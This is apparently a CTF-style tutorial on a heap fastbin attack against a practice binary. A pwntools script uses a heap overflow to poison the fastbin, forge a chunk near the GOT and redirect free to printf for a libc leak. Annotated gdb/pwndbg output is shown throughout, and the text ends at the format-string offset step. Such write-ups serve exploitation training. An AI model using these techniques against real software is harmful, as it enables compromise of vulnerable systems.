## 4.1.3 heap fastbins attack

Write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = './pwn'
elf = context.binary
libc = elf.libc
p = process('./pwn')

def show():
    p.sendlineafter(':', '1')

def add(length, name):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter(':', '4')
    p.sendlineafter(':', str(idx))

p.interactive()
```
add 2 chunks, free chuck2, edit chunk1(heap overflow) to change the fd
```python
add(0x50, '000000')
add(0x50, '111111')

delete(1)
pause()
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0xdeadbeef))
```
gdb break set to the read function in edit
``` gdb -q -p `pidof pwn` -ex "b *0x400C05" -ex "c"```
before edit, chunk2 is freed, to fastbin
```
pwndbg> heapbase
heapbase : 0x727000
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x0000303030303030	0x0000000000000000
0x727040:	0x0000000000000000	0x0000000000000000
0x727050:	0x0000000000000000	0x0000000000000000
0x727060:	0x0000000000000000	0x0000000000000000
0x727070:	0x0000000000000000	0x0000000000000000
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x0000000000000000	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0x0
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$1 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
after edit, 0xdeadbeef is added to fastbin
```
pwndbg> ni
pwndbg> x/40gx 0x727000
0x727000:	0x0000000000000000	0x0000000000000021
0x727010:	0x0000000000400896	0x00000000004008b1
0x727020:	0x0000000000000000	0x0000000000000061
0x727030:	0x7878787878787878	0x7878787878787878
0x727040:	0x7878787878787878	0x7878787878787878
0x727050:	0x7878787878787878	0x7878787878787878
0x727060:	0x7878787878787878	0x7878787878787878
0x727070:	0x7878787878787878	0x7878787878787878
0x727080:	0x0000000000000000	0x0000000000000061
0x727090:	0x00000000deadbeef	0x0000000000000000
0x7270a0:	0x0000000000000000	0x0000000000000000
0x7270b0:	0x0000000000000000	0x0000000000000000
0x7270c0:	0x0000000000000000	0x0000000000000000
0x7270d0:	0x0000000000000000	0x0000000000000000
0x7270e0:	0x0000000000000000	0x0000000000020f21
0x7270f0:	0x0000000000000000	0x0000000000000000
0x727100:	0x0000000000000000	0x0000000000000000
0x727110:	0x0000000000000000	0x0000000000000000
0x727120:	0x0000000000000000	0x0000000000000000
0x727130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x727080 ◂— 0xdeadbeef
0x70: 0x0
0x80: 0x0
pwndbg> p main_arena.fastbinsY
$2 = {0x0, 0x0, 0x0, 0x0, 0x727080, 0x0, 0x0, 0x0, 0x0, 0x0}
```
then malloc twice, 0xdeadbeef is returned, need to set 0xdeadbeef to a useful address.
got is changable
```
pwndbg> checksec
[*] '/root/ctf/1/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
check the got table
```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 12
 
[0x602018] free@GLIBC_2.2.5 -> 0x7f2455ffd540 (free) ◂— push   r13
[0x602020] puts@GLIBC_2.2.5 -> 0x7f2455fe86a0 (puts) ◂— push   r12
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6) ◂— push   2
[0x602030] printf@GLIBC_2.2.5 -> 0x7f2455fce810 (printf) ◂— sub    rsp, 0xd8
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6) ◂— push   4
[0x602040] read@GLIBC_2.2.5 -> 0x7f2456070310 (read) ◂— cmp    dword ptr [rip + 0x2d2429], 0
[0x602048] __libc_start_main@GLIBC_2.2.5 -> 0x7f2455f99750 (__libc_start_main) ◂— push   r14
[0x602050] malloc@GLIBC_2.2.5 -> 0x7f2455ffd180 (malloc) ◂— push   rbp
[0x602058] setvbuf@GLIBC_2.2.5 -> 0x7f2455fe8e80 (setvbuf) ◂— push   rbp
[0x602060] open@GLIBC_2.2.5 -> 0x400766 (open@plt+6) ◂— push   9 /* 'h\t' */
[0x602068] atoi@GLIBC_2.2.5 -> 0x7f2455fafe90 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
```
find valid size before got
```
pwndbg> x/40gx 0x602018-0x40
0x601fd8:	0x0000000000000000	0x0000000000000000
0x601fe8:	0x0000000000000000	0x0000000000000000
0x601ff8:	0x0000000000000000	0x0000000000601e28
0x602008:	0x00007f245656a168	0x00007f245635ae40
0x602018:	0x00007f2455ffd540	0x00007f2455fe86a0
0x602028:	0x00000000004006f6	0x00007f2455fce810
0x602038:	0x0000000000400716	0x00007f2456070310
0x602048:	0x00007f2455f99750	0x00007f2455ffd180
0x602058:	0x00007f2455fe8e80	0x0000000000400766
0x602068:	0x00007f2455fafe90	0x0000000000400786
0x602078:	0x0000000000000000	0x0000000000000000
0x602088:	0x0000000000000000	0x0000000000000000
0x602098:	0x0000000000000000	0x00007f245633e620
0x6020a8:	0x0000000000000000	0x00007f245633d8e0
0x6020b8 <completed.7594>:	0x0000000000000000	0x0000000000000050
0x6020c8 <itemlist+8>:	0x0000000000e14030	0x0000000000000000
0x6020d8 <itemlist+24>:	0x0000000000000000	0x0000000000000000
0x6020e8 <itemlist+40>:	0x0000000000000000	0x0000000000000000
0x6020f8 <itemlist+56>:	0x0000000000000000	0x0000000000000000
0x602108 <itemlist+72>:	0x0000000000000000	0x0000000000000000
```
0x601ffa is OK
```
pwndbg> x/4gx 0x601ffa
0x601ffa:	0x1e28000000000000	0xa168000000000060
0x60200a:	0xae4000007f245656	0xd54000007f245635
```
change 0xdeadbeef to 0x601ffa, molloc twice, and use cyclic to find the free offset to overwrite 
```python
add(0x50, '000000')
add(0x50, '111111')

delete(1)
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0x601ffa))

pause()
add(0x50, '222222')
add(0x50, cyclic(n=8, length=0x30))
```
gdb break set to malloc and read in add
```gdb -q -p `pidof pwn` -ex "b *0x400A6F" -ex "b"*0x400AB8 -ex "c"```
before 2nd malloc, 0x601ffa is waiting to malloc
```
pwndbg> x/40gx 0xbf7000
0xbf7000:	0x0000000000000000	0x0000000000000021
0xbf7010:	0x0000000000400896	0x00000000004008b1
0xbf7020:	0x0000000000000000	0x0000000000000061
0xbf7030:	0x7878787878787878	0x7878787878787878
0xbf7040:	0x7878787878787878	0x7878787878787878
0xbf7050:	0x7878787878787878	0x7878787878787878
0xbf7060:	0x7878787878787878	0x7878787878787878
0xbf7070:	0x7878787878787878	0x7878787878787878
0xbf7080:	0x0000000000000000	0x0000000000000061
0xbf7090:	0x0000000000601ffa	0x0000000000000000
0xbf70a0:	0x0000000000000000	0x0000000000000000
0xbf70b0:	0x0000000000000000	0x0000000000000000
0xbf70c0:	0x0000000000000000	0x0000000000000000
0xbf70d0:	0x0000000000000000	0x0000000000000000
0xbf70e0:	0x0000000000000000	0x0000000000020f21
0xbf70f0:	0x0000000000000000	0x0000000000000000
0xbf7100:	0x0000000000000000	0x0000000000000000
0xbf7110:	0x0000000000000000	0x0000000000000000
0xbf7120:	0x0000000000000000	0x0000000000000000
0xbf7130:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x601ffa ◂— 0x154000007fb2ef45
0x70: 0x0
0x80: 0x0
```
after 2nd read, the offset is 14
 ```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 12
 
[0x602018] free@GLIBC_2.2.5 -> 0x6161616161636161 ('aacaaaaa')
[0x602020] puts@GLIBC_2.2.5 -> 0x6161616161646161 ('aadaaaaa')
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x6161616161656161 ('aaeaaaaa')
[0x602030] printf@GLIBC_2.2.5 -> 0x6161616161666161 ('aafaaaaa')
[0x602038] close@GLIBC_2.2.5 -> 0x406161
[0x602040] read@GLIBC_2.2.5 -> 0x7f37f025f310 (read) ◂— cmp    dword ptr [rip + 0x2d2429], 0
[0x602048] __libc_start_main@GLIBC_2.2.5 -> 0x7f37f0188750 (__libc_start_main) ◂— push   r14
[0x602050] malloc@GLIBC_2.2.5 -> 0x7f37f01ec180 (malloc) ◂— push   rbp
[0x602058] setvbuf@GLIBC_2.2.5 -> 0x7f37f01d7e80 (setvbuf) ◂— push   rbp
[0x602060] open@GLIBC_2.2.5 -> 0x400766 (open@plt+6) ◂— push   9 /* 'h\t' */
[0x602068] atoi@GLIBC_2.2.5 -> 0x7f37f019ee90 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
pwndbg> cyclic -n 8 -l aacaaaaa
14
```
change free to printf to leak libc address, only change 6 bytes to avoid overwriting puts, because there is another off-by-one issue.
```python
add(0x50, '000000')
add(0x50, '111111')

delete(1)
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0x601ffa))

add(0x50, '222222')
# add(0x50, cyclic(n=8, length=0x30))
pause()
add(0x50, flat('\0' * 14, flat(elf.sym['printf'])[:6]))
```
free is change to printf, then we delete actually run printf
```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 12
 
[0x602018] free@GLIBC_2.2.5 -> 0x400700 (printf@plt) ◂— jmp    qword ptr [rip + 0x20192a]
[0x602020] puts@GLIBC_2.2.5 -> 0x7f9e37dd86a0 (puts) ◂— push   r12
[0x602028] __stack_chk_fail@GLIBC_2.4 -> 0x4006f6 (__stack_chk_fail@plt+6) ◂— push   2
[0x602030] printf@GLIBC_2.2.5 -> 0x7f9e37dbe810 (printf) ◂— sub    rsp, 0xd8
[0x602038] close@GLIBC_2.2.5 -> 0x400716 (close@plt+6) ◂— push   4
[0x602040] read@GLIBC_2.2.5 -> 0x7f9e37e60310 (read) ◂— cmp    dword ptr [rip + 0x2d2429], 0
[0x602048] __libc_start_main@GLIBC_2.2.5 -> 0x7f9e37d89750 (__libc_start_main) ◂— push   r14
[0x602050] malloc@GLIBC_2.2.5 -> 0x7f9e37ded180 (malloc) ◂— push   rbp
[0x602058] setvbuf@GLIBC_2.2.5 -> 0x7f9e37dd8e80 (setvbuf) ◂— push   rbp
[0x602060] open@GLIBC_2.2.5 -> 0x400766 (open@plt+6) ◂— push   9 /* 'h\t' */
[0x602068] atoi@GLIBC_2.2.5 -> 0x7f9e37d9fe90 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
```
add 'bin/sh', and to find the format string offset to leak libc
```python
add(0x50, '000000')
add(0x50, '111111')
add(0x10, 'bin/sh\0')

delete(1)
edit(0, 0x100, flat('x' * 0x50, 0, 0x61, 0x601ffa))

add(0x50, '222222')
# add(0x50, cyclic(n=8, length=0x30))
add(0x50, flat('\0' * 14, flat(elf.sym['printf'])[:6]))

pause()
delete(2)
```
gdb set break to free of delete, find the offset 17
```
pwndbg> context
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 RAX  0xc1f0f0 ◂— 0x68732f6e6962 /* 'bin/sh' */
 RBX  0x0
 RCX  0xffffffda
 RDX  0x0
 RDI  0xc1f0f0 ◂— 0x68732f6e6962 /* 'bin/sh' */
 RSI  0x2
 R8   0x0
 R9   0x1999999999999999
 R10  0x0
 R11  0x7f97dbeb06a0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R12  0x4007a0 (_start) ◂— xor    ebp, ebp
 R13  0x7ffc65b9e080 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffc65b9df70 —▸ 0x7ffc65b9dfa0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
 RSP  0x7ffc65b9df50 —▸ 0x7ffc65b9e080 ◂— 0x1
 RIP  0x400cdd (remove_item+144) ◂— call   0x4006d0
pwndbg> stack 20
00:0000│ rsp  0x7ffc65b9df50 —▸ 0x7ffc65b9e080 ◂— 0x1
01:0008│      0x7ffc65b9df58 ◂— 0x200000000
02:0010│      0x7ffc65b9df60 ◂— 0xa32 /* '2\n' */
03:0018│      0x7ffc65b9df68 ◂— 0xa52b29826f768800
04:0020│ rbp  0x7ffc65b9df70 —▸ 0x7ffc65b9dfa0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
05:0028│      0x7ffc65b9df78 —▸ 0x400ead (main+246) ◂— jmp    0x400ed3
06:0030│      0x7ffc65b9df80 ◂— 0x400400ee0
07:0038│      0x7ffc65b9df88 —▸ 0xc1f010 —▸ 0x400896 (hello_message) ◂— push   rbp
08:0040│      0x7ffc65b9df90 —▸ 0x7ffc65b90a34 ◂— 0x0
09:0048│      0x7ffc65b9df98 ◂— 0xa52b29826f768800
0a:0050│      0x7ffc65b9dfa0 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
0b:0058│      0x7ffc65b9dfa8 —▸ 0x7f97dbd59840 (__libc_start_main+240) ◂— mov    edi, eax
0c:0060│      0x7ffc65b9dfb0 ◂— 0x0
0d:0068│      0x7ffc65b9dfb8 —▸ 0x7ffc65b9e088 —▸ 0x7ffc65b9f25a ◂— 0x4158006e77702f2e /* './pwn' */
0e:0070│      0x7ffc65b9dfc0 ◂— 0x100000000
0f:0078│      0x7ffc65b9dfc8 —▸ 0x400db7 (main) ◂— push   rbp
10:0080│      0x7ffc65b9dfd0 ◂— 0x0
11:0088│      0x7ffc65b9dfd8 ◂— 0xace802e808861848
12:0090│      0x7ffc65b9dfe0 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp
13:0098│      0x7ffc65b9dfe8 —▸ 0x7ffc65b9e080 ◂— 0x1
pwndbg> stack 20
00:0000│ rsp  0x7ffd2ab56800 —▸ 0x7ffd2ab56930 ◂— 0x1
01:0008│      0x7ffd2ab56808 ◂— 0x200000000
02:0010│      0x7ffd2ab56810 ◂— 0xa32 /* '2\n' */
03:0018│      0x7ffd2ab56818 ◂— 0x97d62897cc0f000
04:0020│ rbp  0x7ffd2ab56820 —▸ 0x7ffd2ab56850 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
05:0028│      0x7ffd2ab56828 —▸ 0x400ead (main+246) ◂— jmp    0x400ed3
06:0030│      0x7ffd2ab56830 ◂— 0x400400ee0
07:0038│      0x7ffd2ab56838 —▸ 0x25fb010 —▸ 0x400896 (hello_message) ◂— push   rbp
08:0040│      0x7ffd2ab56840 —▸ 0x7ffd2ab50a34 ◂— 0x0
09:0048│      0x7ffd2ab56848 ◂— 0x97d62897cc0f000
0a:0050│      0x7ffd2ab56850 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
0b:0058│      0x7ffd2ab56858 —▸ 0x7f6b7469b840 (__libc_start_main+240) ◂— mov    edi, eax
0c:0060│      0x7ffd2ab56860 ◂— 0x0
0d:0068│      0x7ffd2ab56868 —▸ 0x7ffd2ab56938 —▸ 0x7ffd2ab5725a ◂— 0x4458006e77702f2e /* './pwn' */
0e:0070│      0x7ffd2ab56870 ◂— 0x100000000
0f:0078│      0x7ffd2ab56878 —▸ 0x400db7 (main) ◂— push   rbp
10:0080│      0x7ffd2ab56880 ◂— 0x0
11:0088│      0x7ffd2ab56888 ◂— 0x1fe17733c7107402
12:0090│      0x7ffd2ab56890 —▸ 0x4007a0 (_start) ◂— xor    ebp, ebp
13:0098│      0x7ffd2ab56898 —▸ 0x7ffd2ab56930 ◂— 0x1
pwndbg> fmtarg 0x7ffd2ab56858
The index of format argument : 17 ("\%16$p")
```
change to printf('.%17$p.')
```
```




